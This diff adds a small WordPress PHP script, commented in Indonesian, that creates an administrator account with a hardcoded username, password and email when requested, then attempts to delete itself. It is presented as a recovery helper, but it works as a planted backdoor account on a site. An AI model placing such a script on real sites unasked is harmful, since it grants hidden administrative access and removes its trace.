@@ -1,0 +1,35 @@
+<?php
+// create-admin.php â€” letakkan di root WordPress (satu level dengan wp-load.php)
+// Setelah berhasil, hapus file ini!
+
+require_once __DIR__ . '/wp-load.php';
+
+if ( ! defined('WPINC') ) {
+    echo "Tidak berada di lingkungan WordPress.";
+    exit;
+}
+
+$username = 'adminapek';
+$password = 'apekganteng'; // ganti
+$email    = 'apeknet@gmail.com'; // ganti
+
+if ( username_exists( $username ) || email_exists( $email ) ) {
+    echo "Username atau email sudah ada. Cek kembali.";
+    exit;
+}
+
+$user_id = wp_create_user( $username, $password, $email );
+
+if ( is_wp_error( $user_id ) ) {
+    echo "Gagal buat user: " . $user_id->get_error_message();
+    exit;
+}
+
+// set role administrator
+$user = new WP_User( $user_id );
+$user->set_role( 'administrator' );
+
+// safety: remove this file after success (attempt)
+@unlink( __FILE__ );
+
+echo "Sukses. User dibuat: $username";
